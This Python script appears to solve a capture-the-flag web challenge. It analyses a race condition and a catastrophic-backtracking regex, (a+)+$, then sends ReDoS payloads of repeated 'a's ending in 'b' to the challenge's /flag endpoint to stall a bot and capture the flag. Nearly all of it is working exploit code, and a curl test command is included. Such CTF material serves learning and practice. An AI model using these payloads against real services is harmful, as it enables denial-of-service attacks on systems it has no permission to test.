#!/usr/bin/env python3
"""
Fastest Robot Web Challenge Solver
Exploit ReDoS vulnerability in regex pattern
"""

import requests
import time
import threading

def analyze_vulnerability():
    """
    Analyze the main.py source code for vulnerabilities
    """
    print("🔍 Code Analysis:")
    print("=" * 50)
    
    print("Key findings:")
    print("1. Race condition: Bot gets 2 second head start")
    print("2. Bot processes URL with vulnerable regex: (a+)+$")
    print("3. ReDoS vulnerability: exponential backtracking on patterns like 'aaaaaab'")
    print("4. If we can delay the bot longer than 2 seconds, we win")
    print()
    
    print("🎯 Attack Strategy:")
    print("- Use ReDoS to make bot regex processing take > 2 seconds")
    print("- Access /flag with malicious path that triggers catastrophic backtracking")
    print("- Bot will timeout, we get the flag")
    print()

def create_redos_payload():
    """
    Create a ReDoS payload for the regex (a+)+$
    """
    # Pattern: many 'a's followed by a character that doesn't match
    # This causes exponential backtracking
    payload_base = "a" * 20 + "b"  # Start with moderate length
    
    print(f"🧨 ReDoS Payload: {payload_base}")
    print(f"Length: {len(payload_base)}")
    
    return payload_base

def test_redos_locally():
    """
    Test the ReDoS pattern locally to estimate timing
    """
    import re
    
    print("🧪 Local ReDoS Testing:")
    print("-" * 30)
    
    pattern = re.compile("(a+)+$")
    
    for length in [10, 15, 20, 25]:
        payload = "a" * length + "b"
        start_time = time.time()
        
        try:
            result = pattern.match(payload)
            elapsed = time.time() - start_time
            print(f"Length {length:2}: {elapsed:.4f}s - {'Match' if result else 'No match'}")
            
            if elapsed > 0.1:  # If we're seeing significant delay locally
                print(f"  ⚠️  Potential ReDoS detected at length {length}")
                
        except KeyboardInterrupt:
            elapsed = time.time() - start_time
            print(f"Length {length:2}: {elapsed:.4f}s - INTERRUPTED (likely ReDoS)")
            break

def exploit_redos():
    """
    Exploit the ReDoS vulnerability to win the race
    """
    base_url = "https://cpp.bootupctf.net:8088"
    
    # Create ReDoS payload - adjust length as needed
    # Too short: won't cause enough delay
    # Too long: might cause timeout on our end
    
    redos_payloads = [
        "a" * 18 + "b",   # Moderate
        "a" * 20 + "b",   # More aggressive  
        "a" * 22 + "b",   # Very aggressive
        "a" * 25 + "b",   # Maximum
    ]
    
    for i, payload in enumerate(redos_payloads):
        print(f"\n🚀 Attempt {i+1}: Testing ReDoS payload length {len(payload)}")
        print(f"Payload: {payload}")
        
        flag_url = f"{base_url}/flag/{payload}"
        print(f"Target URL: {flag_url}")
        
        try:
            print("⏱️  Making request...")
            start_time = time.time()
            
            response = requests.get(flag_url, timeout=30)
            
            elapsed = time.time() - start_time
            print(f"⏱️  Response time: {elapsed:.2f}s")
            print(f"📄 Response: {response.text[:200]}...")
            
            # Look for flag pattern
            if "flag" in response.text.lower() and "{" in response.text:
                print("🎉 POTENTIAL FLAG FOUND!")
                
                # Extract flag
                import re
                flag_patterns = [
                    r'flag:\s*<b>([^<]+)</b>',
                    r'[a-zA-Z0-9_]+\{[^}]+\}',
                ]
                
                for pattern in flag_patterns:
                    matches = re.findall(pattern, response.text, re.IGNORECASE)
                    if matches:
                        print(f"🚩 FLAG: {matches[0]}")
                        return matches[0]
                        
                print(f"Raw response: {response.text}")
                return response.text
                
        except requests.exceptions.Timeout:
            elapsed = time.time() - start_time
            print(f"⏱️  Request timed out after {elapsed:.2f}s")
            print("🤔 Bot might be stuck in ReDoS, but our request timed out too")
            
        except Exception as e:
            elapsed = time.time() - start_time
            print(f"⏱️  Error after {elapsed:.2f}s: {e}")
    
    return None

def main():
    print("🤖 Fastest Robot Challenge Solver")
    print("=" * 50)
    
    analyze_vulnerability()
    
    print("🧪 Testing ReDoS locally first...")
    test_redos_locally()
    
    print("\n🎯 Exploiting remote target...")
    flag = exploit_redos()
    
    if flag:
        print(f"\n🎉 Challenge Solved!")
        print(f"Flag: {flag}")
    else:
        print(f"\n🤔 Exploit didn't work. Try:")
        print("1. Adjusting ReDoS payload length")
        print("2. Testing different patterns")
        print("3. Manual timing analysis")
        
        print(f"\n💡 Manual test command:")
        print(f"curl 'https://cpp.bootupctf.net:8088/flag/{'a' * 20}b'")

if __name__ == "__main__":
    main()
